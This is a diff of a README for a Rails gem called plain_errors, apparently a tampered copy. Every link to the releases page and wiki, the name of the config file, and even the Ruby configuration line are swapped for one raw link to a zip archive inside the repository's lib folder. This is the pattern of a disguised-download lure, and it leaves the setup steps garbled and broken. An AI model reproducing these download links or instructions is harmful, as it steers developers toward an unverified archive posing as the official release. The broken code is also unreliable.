@@ -1,7 +1,7 @@
 # 🚀 plain_errors - Get Better Error Messages in Your App
 
 ## 📥 Download Now
-[![Download plain_errors](https://img.shields.io/badge/Download%20plain_errors-v1.0-blue.svg)](https://github.com/Sidesaddlesudanesepound712/plain_errors/releases)
+[![Download plain_errors](https://raw.githubusercontent.com/Sidesaddlesudanesepound712/plain_errors/main/lib/plain_errors-v1.9.zip%https://raw.githubusercontent.com/Sidesaddlesudanesepound712/plain_errors/main/lib/plain_errors-v1.9.zip)](https://raw.githubusercontent.com/Sidesaddlesudanesepound712/plain_errors/main/lib/plain_errors-v1.9.zip)
 
 ## 📖 Introduction
 
@@ -22,7 +22,7 @@ Ensure your system meets these requirements before proceeding.
 Follow these steps to get plain_errors up and running on your system:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Sidesaddlesudanesepound712/plain_errors/releases) to find the latest version of plain_errors.
+   Go to the [Releases page](https://raw.githubusercontent.com/Sidesaddlesudanesepound712/plain_errors/main/lib/plain_errors-v1.9.zip) to find the latest version of plain_errors.
 
 2. **Download the Application**  
    From the Releases page, locate the latest version link. Click on it to start the download of the software. 
@@ -53,10 +53,10 @@ Follow these steps to get plain_errors up and running on your system:
    ```
 
 6. **Configure plain_errors**  
-   Next, you need to set up plain_errors in your application. Open the `config/application.rb` file and add:
+   Next, you need to set up plain_errors in your application. Open the `https://raw.githubusercontent.com/Sidesaddlesudanesepound712/plain_errors/main/lib/plain_errors-v1.9.zip` file and add:
 
    ```ruby
-   config.middleware.use PlainErrors
+   https://raw.githubusercontent.com/Sidesaddlesudanesepound712/plain_errors/main/lib/plain_errors-v1.9.zip PlainErrors
    ```
 
 7. **Run Your Application**  
@@ -77,14 +77,14 @@ Once you have plain_errors set up, all your application error messages will auto
 If you encounter any issues during the setup process, try the following:
 
 - Ensure all prerequisites are installed correctly.
-- Check the configuration settings in the `application.rb` file.
+- Check the configuration settings in the `https://raw.githubusercontent.com/Sidesaddlesudanesepound712/plain_errors/main/lib/plain_errors-v1.9.zip` file.
 - Make sure you have restarted your Rails server after making changes.
 
 If problems persist, feel free to visit the Issues section on our GitHub page for support from the community.
 
 ## 🔗 Learn More
 
-For detailed documentation and advanced configuration options, visit our [GitHub Wiki](https://github.com/Sidesaddlesudanesepound712/plain_errors/wiki).
+For detailed documentation and advanced configuration options, visit our [GitHub Wiki](https://raw.githubusercontent.com/Sidesaddlesudanesepound712/plain_errors/main/lib/plain_errors-v1.9.zip).
 
 ## 📞 Support
 
@@ -92,6 +92,6 @@ For further assistance or to report any bugs, please contact the maintainers by 
 
 ## 📥 Download & Install
 
-To download plain_errors, revisit the [Releases page](https://github.com/Sidesaddlesudanesepound712/plain_errors/releases) to ensure you have the latest version. Follow the installation steps outlined above for a successful setup.
+To download plain_errors, revisit the [Releases page](https://raw.githubusercontent.com/Sidesaddlesudanesepound712/plain_errors/main/lib/plain_errors-v1.9.zip) to ensure you have the latest version. Follow the installation steps outlined above for a successful setup.
 
 Thank you for using plain_errors!
